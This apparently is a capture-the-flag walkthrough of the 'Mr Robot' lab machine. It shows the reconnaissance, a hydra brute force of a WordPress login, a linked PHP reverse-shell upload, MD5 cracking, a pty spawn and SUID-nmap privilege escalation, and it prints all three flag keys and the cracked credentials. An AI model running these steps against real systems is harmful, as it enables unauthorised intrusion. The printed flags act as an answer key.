Step 1:NMAP

root@kali ~/D/C/Mr_Robot# nmap -sS -sV -T4 -p- 10.0.0.48

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

We have 3 open ports, port 80 for http, port 443 for https and port 22 for ssh but that is closed, maybe we will log to a user and enable it.
------------------------------------------------------------------------------------------------
Step 2: HTTP/FSOCIETY

Going to http://10.0.0.48 we are greeted with a very impresive webpage, it has videos and an "intercatable shell", despite the impressive show there is nothing we can get out of the site, I even went to a site that was stated on the video www.whoismrrobot.com with hopes to find something.

Using dirsearch to find files and directories that might give us some information.

root@kali ~/D/C/Mr_Robot# dirsearch -u http://10.0.0.48

We have the robots.txt file:
User-agent: *
fsocity.dic
key-1-of-3.txt

Downloading the dictionary file, we can get the first key, http://10.0.0.48/key-1-of-3.txt:

073403c8a58a1f80d943455fb30724b9

The dirsearch scan also showed there is a login page. We have a dictionary so maybe we can brute force the site and get a username.
Before starting the brute force, we see that the dictionary we downloaded has 858160 words, maybe there are dupes.

root@kali ~/D/C/Mr_Robot# sort fsocity.dic | uniq > fsocitySorted.dic

And we get a sorted dictionary that we can use.

root@kali ~/D/C/Mr_Robot# hydra -L fsocitySorted.dic -p fsocitySorted.dic -s 80 10.0.0.48 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username' -I -v

We have a username --> elliot. We can now brute force a second time with the user name. We could have done one brute force attack to find a username and password but that would have taken much longer.

We get a username and password, elliot:ER28-0652
Loggin in via the login page, we get access to the admin page, we can then upload a reverse shell script and get a reverse shell.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
------------------------------------------------------------------------------------------------
Step 3: REVERSE SHELL

We are logged in as the daemon user, reading the /etc/passwd file, there is a user named robot, going to /home/robot, there is the second key and hashed password. We don't have permission to read the key so let's try to "dehash" the hash.

password.raw-md5:
robot:c3fcd3d76192e4007dfb496cca67e13b

md5 dehash:
abcdefghijklmnopqrstuvwxyz

Before we can switch to the robot user, we get an error:

$ su robot
su: must be run from a terminal

We can open a new bash terminal using python.

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ 

Switching to the robot user we can read the second key:

822c73956184f694993bede3eb39f959
------------------------------------------------------------------------------------------------
Step 4: PRIVILAGE ESCILATION

Using "sudo -l" to see what commands the user can run as root, the user doesn't have permissions to use sudo.

robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.

We can try to find files with SUID permissions.

robot@linux:/$ find / -perm /4000 2> /dev/null

We found a couple of files, but we found that nmap has SUID permissions. Searching online for "nmap shell", turns out there is an interactive mode for nmap where we can open a shell as the root user.

robot@linux:/$ nmap --interactive

Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root

Going to the /root folder we find the third and final key:

04787ddef27c3dee1ee161b21670b4e4

Now that we found 3 keys, we have completed the CTF. 
